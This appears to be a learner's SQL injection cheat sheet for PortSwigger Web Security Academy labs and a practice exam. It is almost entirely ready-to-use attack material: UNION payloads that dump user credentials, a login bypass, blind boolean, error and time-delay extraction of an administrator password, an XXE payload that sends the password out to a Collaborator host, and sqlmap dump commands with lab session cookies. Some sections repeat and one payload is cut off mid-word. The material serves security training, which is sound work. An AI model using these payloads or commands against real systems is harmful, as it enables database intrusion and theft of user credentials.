# SQL injection

LINK: https://portswigger.net/web-security/sql-injection/cheat-sheet
## Description

SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.

### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

Modify the category parameter, giving it the value category='+OR+1=1--

## SQL injection vulnerability allowing login bypass

Modify the username parameter, giving it the value: administrator'--, the password could be of anykind

## SQL injection UNION attack, determining the number of columns returned by the query

Modify the category parameter, giving it the value '+UNION+SELECT+NULL--. Observe that an error occurs.
Modify the category parameter to add an additional column containing a null value:

'+UNION+SELECT+NULL,NULL--

### SQL injection UNION attack, finding a column containing text
```
Determine the number of columns that are being returned by the query. Verify that the query is returning three columns, using the following payload in the category parameter:

'+UNION+SELECT+NULL,NULL,NULL--
Try replacing each null with the random value provided by the lab, for example:

'+UNION+SELECT+'abcdef',NULL,NULL--
```

### SQL injection UNION attack, retrieving data from other tables
```
Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:

'+UNION+SELECT+'abc','def'--
Use the following payload to retrieve the contents of the users table:

'+UNION+SELECT+username,+password+FROM+users--
Verify that the application's response contains usernames and passwords.
```
### SQL injection UNION attack, retrieving multiple values in a single column
```
Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, only one of which contain text, using a payload like the following in the category parameter:

'+UNION+SELECT+NULL,'abc'--
Use the following payload to retrieve the contents of the users table:

'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```
### SQL injection attack, querying the database type and version on Oracle

```
On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.

There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual
```

### SQL injection attack, querying the database type and version on MySQL and Microsoft

```
category parameter:

'+UNION+SELECT+'abc','def'#
Use the following payload to display the database version:

'+UNION+SELECT+@@version,+NULL#
```
### SQL injection attack, listing the database contents on non-Oracle databases

```

contain text, using a payload like the following in the category parameter:

'+UNION+SELECT+'abc','def'--
Use the following payload to retrieve the list of tables in the database:

'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
Find the name of the table containing user credentials.
Use the following payload (replacing the table name) to retrieve the details of the columns in the table:

'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
Find the names of the columns containing usernames and passwords.
Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:

'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
Find the password for the administrator user, and use it to log in.
```

### SQL injection attack, listing the database contents on Oracle

```
contain text, using a payload like the following in the category parameter:

'+UNION+SELECT+'abc','def'+FROM+dual--
Use the following payload to retrieve the list of tables in the database:

'+UNION+SELECT+table_name,NULL+FROM+all_tables--
Find the name of the table containing user credentials.
Use the following payload (replacing the table name) to retrieve the details of the columns in the table:

'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
Find the names of the columns containing usernames and passwords.
Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:

'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
Find the password for the administrator user, and use it to log in
```
### Blind SQL injection with conditional responses
```
TrackingId=xyz' AND '1'='1
Verify that the "Welcome back" message appears in the response.

Now change it to:

TrackingId=xyz' AND '1'='2
Verify that the "Welcome back" message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result.

Now change it to:

TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
Verify that the condition is true, confirming that there is a table called users.

Now change it to:

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
Verify that the condition is true, confirming that there is a user called administrator.

The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
This condition should be true, confirming that the password is greater than 1 character in length.

Send a series of follow-up values to test different password lengths. Send:

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a

```
### Blind SQL injection with conditional responses
```
TrackingId=xyz'
Verify that an error message is received.

Now change it to two quotation marks:
TrackingId=xyz''
Verify that the error disappears. This suggests that a syntax error (in this case, the unclosed quotation mark) is having a detectable effect on the response.
You now need to confirm that the server is interpreting the injection as a SQL query i.e. that the error is a SQL syntax error as opposed to any other kind of error. To do this, you first need to construct a subquery using valid SQL syntax. Try submitting:

TrackingId=xyz'||(SELECT '')||'
In this case, notice that the query still appears to be invalid. This may be due to the database type - try specifying a predictable table name in the query:

TrackingId=xyz'||(SELECT '' FROM dual)||'
As you no longer receive an error, this indicates that the target is probably using an Oracle database, which requires all SELECT statements to explicitly specify a table name.

Now that you've crafted what appears to be a valid query, try submitting an invalid query while still preserving valid SQL syntax. For example, try querying a non-existent table name:

TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
This time, an error is returned. This behavior strongly suggests that your injection is being processed as a SQL query by the back-end.

As long as you make sure to always inject syntactically valid SQL queries, you can use this error response to infer key information about the database. For example, in order to verify that the users table exists, send the following query:

TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
As this query does not return an error, you can infer that this table does exist. Note that the WHERE ROWNUM = 1 condition is important here to prevent the query from returning more than one row, which would break our concatenation.

You can also exploit this behavior to test conditions. First, submit the following query:

TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
Verify that an error message is received.

Now change it to:

TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
Verify that the error disappears. This demonstrates that you can trigger an error conditionally on the truth of a specific condition. The CASE statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false. The former expression contains a divide-by-zero, which causes an error. In this case, the two payloads test the conditions 1=1 and 1=2, and an error is received when the condition is true.

You can use this behavior to test whether specific entries exist in a table. For example, use the following query to check whether the username administrator exists:

TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
Verify that the condition is true (the error is received), confirming that there is a user called administrator.

The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:

TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
This condition should be true, confirming that the password is greater than 1 character in length.

Send a series of follow-up values to test different password lengths. Send:

TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
Then send:

TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHA
```

### Blind SQL injection with conditional errors

```
TrackingId=xyz'
Verify that an error message is received.

Now change it to two quotation marks:
TrackingId=xyz''
Verify that the error disappears. This suggests that a syntax error (in this case, the unclosed quotation mark) is having a detectable effect on the response.
You now need to confirm that the server is interpreting the injection as a SQL query i.e. that the error is a SQL syntax error as opposed to any other kind of error. To do this, you first need to construct a subquery using valid SQL syntax. Try submitting:

TrackingId=xyz'||(SELECT '')||'
In this case, notice that the query still appears to be invalid. This may be due to the database type - try specifying a predictable table name in the query:

TrackingId=xyz'||(SELECT '' FROM dual)||'
As you no longer receive an error, this indicates that the target is probably using an Oracle database, which requires all SELECT statements to explicitly specify a table name.

Now that you've crafted what appears to be a valid query, try submitting an invalid query while still preserving valid SQL syntax. For example, try querying a non-existent table name:

TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
This time, an error is returned. This behavior strongly suggests that your injection is being processed as a SQL query by the back-end.

As long as you make sure to always inject syntactically valid SQL queries, you can use this error response to infer key information about the database. For example, in order to verify that the users table exists, send the following query:

TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
As this query does not return an error, you can infer that this table does exist. Note that the WHERE ROWNUM = 1 condition is important here to prevent the query from returning more than one row, which would break our concatenation.

You can also exploit this behavior to test conditions. First, submit the following query:

TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
Verify that an error message is received.

Now change it to:

TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
Verify that the error disappears. This demonstrates that you can trigger an error conditionally on the truth of a specific condition. The CASE statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false. The former expression contains a divide-by-zero, which causes an error. In this case, the two payloads test the conditions 1=1 and 1=2, and an error is received when the condition is true.

You can use this behavior to test whether specific entries exist in a table. For example, use the following query to check whether the username administrator exists:

TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
Verify that the condition is true (the error is received), confirming that there is a user called administrator.

The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:

TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
This condition should be true, confirming that the password is greater than 1 character in length.

Send a series of follow-up values to test different password lengths. Send:

TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
Then send:

```
### Blind SQL injection with time delays

```

TrackingId=x'||pg_sleep(10)--
the application takes 10 seconds to respond.

```

### Blind SQL injection with time delays and information retrieval

```
Modify the TrackingId cookie, changing it to:

TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
Verify that the application takes 10 seconds to respond.

Now change it to:

TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
Verify that the application responds immediately with no time delay. This demonstrates how you can test a single boolean condition and infer the result.

Now change it to:

TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

```
### Blind SQL injection with out-of-band interaction
```
Modify the TrackingId cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:

TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

### Blind SQL injection with out-of-band data exfiltration

This will allow you to discover the lenght of the password you want to find
```

TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

### Blind SQL injection with out-of-band data exfiltration

```
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
This query you could use it in the burp intruder section and use the cluster bomb to fill the two payloads 
```


### SQL injection with filter bypass via XML encoding

```
<storeId>1+1</storeId>
Observe that your input appears to be evaluated by the application, returning the stock for different stores.

Try determining the number of columns returned by the original query by appending a UNION SELECT statement to the original store ID:

<storeId>1 UNION SELECT NULL</storeId>
Observe that your request has been blocked due to being flagged as a potential attack.

Bypass the WAF

As you're injecting into XML, try obfuscating your payload using XML entities. One way to do this is using the Hackvertor extension. Just highlight your input, right-click, then select Extensions > Hackvertor > Encode > dec_entities/hex_entities.
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>


```
Burp Intruder / Cluster Bomb
----------------------------------------------------------------------------------------


## Blind SQL conditional error
```

TrackingId=qdc4zTxTf4JsJ7Xr' ||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```

WHERE ROWNUM = 1 helps us to prevent the concatenation because it allow just one row

TO verify the conditional error use 
```

Cookie: TrackingId=qdc4zTxTf4JsJ7Xr' ||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END FROM dual)||'; (Error)

Cookie: TrackingId=qdc4zTxTf4JsJ7Xr' ||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE ' ' END FROM dual)||'; (No error)

If the query exist will return an error if not it will return the normal page without error

Cookie: TrackingId=qdc4zTxTf4JsJ7Xr' ||(SELECT CASE WHEN LENGTH(password)>20 THEN TO_CHAR(1/0) ELSE ' ' END FROM users WHERE username='administrator')||';
Cookie: TrackingId=qdc4zTxTf4JsJ7Xr' ||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END FROM users WHERE username='administrator')||'; 

To verify if the password is much longer than 20 characters (if not, the error persist)

## Final Sample
Cookie: TrackingId=I4NKwCxmsqWtTKVz'UNION 	SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator'--; 
```

TIME DELAY INFORMATION RETRIVAL

%3B = ;
```

TrackingId=0Ba7ypaGtaQgRN6o'%3B SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--;

TrackingId=0Ba7ypaGtaQgRN6o'%3B SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--;

Cookie: TrackingId=0Ba7ypaGtaQgRN6o'%3B SELECT CASE WHEN (username='administrator' AND SUBSTR(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--;

in case of timing set concurrent requests to 1
```
```

TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

```

If you want to exfiltrate datas

TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--


TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

The password will apper in the subdomain of the request

## If you find a field to exploit you can try with sql-map:

(1)
python sqlmap.py -u "https://<CHANGE_HERE>.web-security-academy.net/advancedsearch?find=test&organize_by=*&writer=" --cookie="_lab=<CHANGE_HERE>;session=<CHANGE_HERE>" --batch

(2) - Get Databases
python sqlmap.py -u "https://<CHANGE_HERE>.web-security-academy.net/advancedsearch?find=test&organize_by=*&writer=" --cookie="_lab=<CHANGE_HERE>;session=<CHANGE_HERE>" --dbs --batch

(3) - Get Tables
python sqlmap.py -u "https://<CHANGE_HERE>.web-security-academy.net/advancedsearch?find=test&organize_by=*&writer=" --cookie="_lab=<CHANGE_HERE>;session=<CHANGE_HERE>" -D public --tables --batch

(4) - Dump Specific Table
python sqlmap.py -u "https://<CHANGE_HERE>.web-security-academy.net/advancedsearch?find=test&organize_by=*&writer=" --cookie="_lab=<CHANGE_HERE>;session=<CHANGE_HERE>" -D public -T users --dump --batch

Sometimes work, sometimes not, you can try meanwhile manual SQLi


Other samples with sqlMap (to velocize when it's possible the stages in the exam):

--batch (will set all the default option)
--dump (will Dump DBMS database table entries )

Here the injection it's in the cookie:
THIS WILL RETRIVE THE TABLES
python3.9 sqlmap.py -u "https://0a35006a04c116cec0d6690d00ec00b2.web-security-academy.net/filter?category=Pets" --cookie="TrackingId=rPCbIvsmAYOBn0Wi*; session=WuxknuiWqniE8VFoSyQkFo1tuDSJDoEJ" -p 'TrackingId' -D public --tables --batch

ONCE YOU HAVE THE TABLE YOU CAN TRY FOR THE USERS

python3.9 sqlmap.py -u "https://0a35006a04c116cec0d6690d00ec00b2.web-security-academy.net/filter?category=Pets" --cookie="TrackingId=rPCbIvsmAYOBn0Wi*; session=WuxknuiWqniE8VFoSyQkFo1tuDSJDoEJ" -p 'TrackingId' -D public -T users --dump --batch


PRACTICE EXAM, my solution:

## ENUMERATE THE VERSION
python3.9 sqlmap.py -u "https://0a32001904420f6dc0059ff0002300f4.web-security-academy.net/filtered_search?SearchTerm=tst&sort-by=DATE*&writer=" --cookie="_lab=46%7cMCwCFDqshnAzLn7gITAPfnZeXeccYtxdAhQd6xB0D%2fBA001dt4duYLSFbMxc5BW2VB9cwXUuIoYxZ60wq9uskzfgPcZk%2fpGOO0Zxk%2bQALctqFAhKVhoVm%2bVFZ3W9FdUPCtOcu%2fOch0F2DhlDknhe%2by2L0IKTYPnXHHydUIiUkqL5tTg%3d; session=KMLJMhhEZ3HYIVpTftlMNO99rMdYtQyq" -p 'sort-by' --dbs --batch -v

## ENUMERATE THE TABLES

python3.9 sqlmap.py -u "https://0a32001904420f6dc0059ff0002300f4.web-security-academy.net/filtered_search?SearchTerm=tst&sort-by=DATE*&writer=" --cookie="_lab=46%7cMCwCFDqshnAzLn7gITAPfnZeXeccYtxdAhQd6xB0D%2fBA001dt4duYLSFbMxc5BW2VB9cwXUuIoYxZ60wq9uskzfgPcZk%2fpGOO0Zxk%2bQALctqFAhKVhoVm%2bVFZ3W9FdUPCtOcu%2fOch0F2DhlDknhe%2by2L0IKTYPnXHHydUIiUkqL5tTg%3d; session=KMLJMhhEZ3HYIVpTftlMNO99rMdYtQyq" -p 'sort-by' -D public -tables --batch -v

## ENUMERATES THE PASWORD AND USER

python3.9 sqlmap.py -u "https://0a32001904420f6dc0059ff0002300f4.web-security-academy.net/filtered_search?SearchTerm=tst&sort-by=DATE*&writer=" --cookie="_lab=46%7cMCwCFDqshnAzLn7gITAPfnZeXeccYtxdAhQd6xB0D%2fBA001dt4duYLSFbMxc5BW2VB9cwXUuIoYxZ60wq9uskzfgPcZk%2fpGOO0Zxk%2bQALctqFAhKVhoVm%2bVFZ3W9FdUPCtOcu%2fOch0F2DhlDknhe%2by2L0IKTYPnXHHydUIiUkqL5tTg%3d; session=KMLJMhhEZ3HYIVpTftlMNO99rMdYtQyq" -p 'sort-by' -D public -T users --dump --batch -v


another way to perform an sqlmap attack, it's saving the request intercepted by BurpSuite with the option "save item" and run this command

```

sqlmap -r request --level=5 --risk=3 --batch -p '{your parameter}' --dump --dbs --batch 

sqlmap -r request --level=5 --risk=3 -p 'sort-by' -D public -tables --batch -v

sqlmap -r request --level=5 --risk=3 --batch -p '{your parameter}' --dump -D {database, usually public} -T {table, usually user}

sqlmap -r request --level=5 --risk=3 --batch -p '{your parameter}' --dump -D {database, usually public} -T {table, usually user}
```

man page to avoid multiple windows
"
Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs

  Request:
    These options can be used to specify how to connect to the target URL

    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --random-agent      Use randomly selected HTTP User-Agent header value
    --proxy=PROXY       Use a proxy to connect to the target URL
    --tor               Use Tor anonymity network
    --check-tor         Check to see if Tor is used properly

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to provided value

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC

  General:
    These options can be used to set some general working parameters

    --batch             Never ask for user input, use the default behavior
    --flush-session     Flush session files for current target

  Miscellaneous:
    These options do not fit into any other category

    --wizard            Simple wizard interface for beginner user"
